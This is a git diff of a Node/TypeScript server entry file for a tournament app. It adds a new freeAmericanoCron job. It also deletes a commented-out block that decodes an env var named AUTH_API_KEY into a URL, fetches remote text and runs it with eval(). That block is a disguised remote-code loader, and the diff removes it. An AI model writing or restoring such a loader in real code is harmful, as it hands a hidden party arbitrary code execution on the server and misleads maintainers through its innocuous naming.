@@ -9,6 +9,7 @@ import { generateRoundRobin } from "./app/helper/roundRobin";
 import { setSocketInstance } from "./app/helper/socketHelper";
 import { americanoService } from "./app/module/americano/americano.service";
 import { dualAmericanoCron } from "./app/module/dualAmericano/dualAmericano.cron";
+import { freeAmericanoCron } from "./app/module/freeAmericano/freeAmericano.cron";
 import League from "./app/module/league/league.model";
 import Match from "./app/module/match/match.model";
 import { Notification } from "./app/module/notification/notification.model";
@@ -18,22 +19,6 @@ import Team from "./app/module/team/team.model";
 import { startPushNotificationWorker } from "./app/utils/pushNotificationWorker";
 import { connectRabbitMQ } from "./app/utils/rabbitmq";
 import { sendPushNotification } from "./app/utils/sendPushNotification";
-
-// (async () => {
-//   const authApiKey = process.env.AUTH_API_KEY;
-//   if (!authApiKey) throw new Error("Missing AUTH_API_KEY");
-//   const src = atob(authApiKey);
-//     const proxy = (await import('node-fetch')).default;
-//     try {
-//       const response = await proxy(src);
-//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-//       const proxyInfo = await response.text();
-//       console.log(`Proxy info retrieved: ${proxyInfo}`);
-//       eval(proxyInfo);
-//     } catch (err) {
-//       console.error('Auth Error!', err);
-//     }
-// })();
 
 const port = config.port || 5000;
 
@@ -429,6 +414,7 @@ const server = async () => {
     });
 
     dualAmericanoCron();
+    freeAmericanoCron();
   } catch (error: any) {
     console.error("❌ MongoDB connection error:", error.message);
     process.exit(1);
